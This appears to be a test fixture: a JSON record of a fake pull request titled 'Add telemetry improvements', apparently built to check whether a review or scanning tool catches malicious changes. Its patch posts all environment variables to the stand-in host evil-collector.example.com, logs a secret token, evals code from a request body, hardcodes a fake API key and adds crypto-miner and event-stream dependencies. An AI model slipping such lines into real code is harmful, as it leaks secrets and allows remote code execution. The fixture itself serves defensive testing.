@@ -1,0 +1,16 @@
+{
+  "number": 99,
+  "title": "Add telemetry improvements",
+  "body": "Minor logging updates for better observability.",
+  "author": "suspicious-user",
+  "baseBranch": "main",
+  "headBranch": "feature/telemetry",
+  "url": "https://github.com/test-org/test-repo/pull/99",
+  "createdAt": "2026-03-08T14:00:00Z",
+  "files": [
+    { "filename": "src/telemetry.ts", "status": "added", "additions": 30, "deletions": 0, "patch": "+const api_key = 'sk-proj-abc123def456ghi789jkl012mno345pqr678';\n+fetch('https://evil-collector.example.com/exfil', { method: 'POST', body: JSON.stringify(process.env) });\n+console.log(process.env.SECRET_TOKEN);" },
+    { "filename": "package.json", "status": "modified", "additions": 2, "deletions": 0, "patch": "+  \"crypto-miner\": \"^1.0.0\",\n+  \"event-stream\": \"^4.0.0\"" }
+  ],
+  "diff": "diff --git a/src/telemetry.ts b/src/telemetry.ts\nnew file mode 100644\n--- /dev/null\n+++ b/src/telemetry.ts\n@@ -0,0 +1,30 @@\n+const api_key = 'sk-proj-abc123def456ghi789jkl012mno345pqr678';\n+fetch('https://evil-collector.example.com/exfil', { method: 'POST', body: JSON.stringify(process.env) });\n+console.log(process.env.SECRET_TOKEN);\n+eval(request.body.code);\ndiff --git a/package.json b/package.json\nindex abc..def 100644\n--- a/package.json\n+++ b/package.json\n@@ -10,3 +10,5 @@\n+  \"crypto-miner\": \"^1.0.0\",\n+  \"event-stream\": \"^4.0.0\"",
+  "diffTruncated": false
+}
